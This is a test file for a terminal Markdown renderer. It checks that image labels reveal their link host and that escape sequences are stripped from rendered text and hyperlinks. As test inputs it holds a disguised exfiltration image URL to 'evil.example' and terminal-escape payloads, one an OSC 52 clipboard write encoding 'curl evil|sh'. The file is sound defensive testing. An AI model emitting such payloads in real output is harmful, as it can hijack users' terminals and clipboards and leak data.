import { describe, expect, it } from 'vitest';
import { render } from 'ink-testing-library';
import { hyperlink, MdLineView, plainText, renderMarkdown, wrapSpans, type MdLine } from '../src/tui/markdown.js';

const text = (md: string, w = 80) => renderMarkdown(md, w).map(plainText);
const spans = (md: string, w = 80) => renderMarkdown(md, w).flat();
// The image label as rendered (wrapSpans splits it into word spans) and its link target.
const image = (md: string) => {
  const line = renderMarkdown(md, 200).find((l) => plainText(l).includes('[image'));
  if (!line) return undefined;
  return { text: plainText(line).match(/\[image[^\]]*\]/)![0], href: line.find((s) => s.href)?.href };
};
// Any C0 control except \t and \n, DEL, or C1.
const CONTROL = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/;

describe('images', () => {
  it('labels linked images with their host so a disguised link is visible', () => {
    const img = image('![diagram](https://evil.example/collect?d=secret)');
    expect(img?.text).toBe('[image: diagram · evil.example]');
    expect(img?.href).toBe('https://evil.example/collect?d=secret');
    expect(image('![](https://cdn.example/a.png)')?.text).toBe('[image · cdn.example]');
  });

  it('leaves non-http images unlinked and without a host', () => {
    const img = image('![local](x.png)');
    expect(img?.text).toBe('[image: local]');
    expect(img?.href).toBeUndefined();
  });

  it('decodes HTML <img> alt text exactly once, as a block', () => {
    const img = image('<img src="https://x.example/a.png" alt="&amp;lt;b&amp;gt; &amp;amp;">');
    expect(img?.text).toBe('[image: &lt;b&gt; &amp; · x.example]');
  });

  it('decodes HTML <img> alt text exactly once, inline', () => {
    const img = image('see <img src="https://x.example/a.png" alt="&amp;lt;b&amp;gt;"> here');
    expect(img?.text).toBe('[image: &lt;b&gt; · x.example]');
  });

  it('still decodes entities in Markdown image alt text', () => {
    expect(image('![a &amp; b](https://x.example/a.png)')?.text).toBe('[image: a & b · x.example]');
  });

  it('keeps a backslash in HTML alt text', () => {
    expect(image('<img src="https://x.example/a.png" alt="C:\\temp">')?.text).toBe('[image: C:\\temp · x.example]');
    // A trailing backslash must not escape the closing ] of the generated Markdown.
    expect(image('<img src="https://x.example/a.png" alt="dir\\">')?.text).toBe('[image: dir\\ · x.example]');
  });

  it('percent-encodes parentheses in an HTML <img> src so the Markdown link stays intact', () => {
    const lines = text('<img src="https://x.example/a(1.png" alt="shot">');
    expect(lines).toEqual(['[image: shot · x.example]']);
    expect(image('<img src="https://x.example/a(1.png" alt="shot">')?.href).toBe('https://x.example/a%281.png');
    expect(image('<img src="https://x.example/a)b (c).png">')?.href).toBe('https://x.example/a%29b%20%28c%29.png');
  });

  it('reads src with spaces around = and unquoted values', () => {
    expect(image('<img src = "https://x.example/spaced.png" alt = \'sp\'>')).toMatchObject({ text: '[image: sp · x.example]', href: 'https://x.example/spaced.png' });
    expect(image('<img src=https://x.example/bare.png alt=bare>')).toMatchObject({ text: '[image: bare · x.example]', href: 'https://x.example/bare.png' });
  });
});

describe('terminal escape stripping in Markdown', () => {
  const evil = 'Title \u001b]52;c;Y3VybCBldmlsfHNo\u0007 and \u009b2J and \u009d0;pwned\u009c and \u001b[2J';

  it('strips controls from every span renderMarkdown returns', () => {
    for (const md of [
      evil,
      `# ${evil}`,
      `- ${evil}\n  - ${evil}`,
      `> ${evil}`,
      `\`${evil}\``,
      `\`\`\`\n${evil}\n\`\`\``,
      `| a | b |\n|---|---|\n| ${evil} | x |`,
      `<details><summary>${evil}</summary>\n\n${evil}\n</details>`,
      `[${evil}](https://e.example/\u009d)`,
      `![${evil}](https://e.example/\u001b]52;c;x\u0007)`,
      `a &#27;]52;c;x&#7; b`,
    ]) {
      for (const s of spans(md)) {
        expect(s.text).not.toMatch(CONTROL);
        if (s.href) expect(s.href).not.toMatch(CONTROL);
      }
    }
  });

  it('strips controls in wrapSpans', () => {
    const lines = wrapSpans([{ text: evil }], 20);
    for (const s of lines.flat()) expect(s.text).not.toMatch(CONTROL);
    expect(lines.map(plainText).join(' ')).toContain('52;c;');
  });

  it('turns CRLF into line breaks rather than dropping the break', () => {
    expect(text('one\r\n\r\ntwo')).toEqual(['one', '', 'two']);
  });
});

describe('hyperlink', () => {
  it('strips C0 and C1 controls from the href', () => {
    expect(hyperlink('t', 'https://e.example/\u0007\u001b]52;c;x\u009c\u009d\u009b/y')).toBe('\u001b]8;;https://e.example/]52;c;x/y\u0007t\u001b]8;;\u0007');
  });

  it('renders as a single OSC 8 link with no injected sequences', () => {
    const line: MdLine = [{ text: 'img\u001b]52;c;x\u0007', href: 'https://e.example/\u009d52;c;x\u009c' }];
    const ui = render(<MdLineView line={line} />);
    const frame = ui.lastFrame()!;
    expect(frame).not.toContain('\u001b]52');
    expect(frame).not.toMatch(/[\u0080-\u009f]/);
    expect(frame.match(/\u001b\]8;;/g)).toHaveLength(2);
    ui.unmount();
  });
});
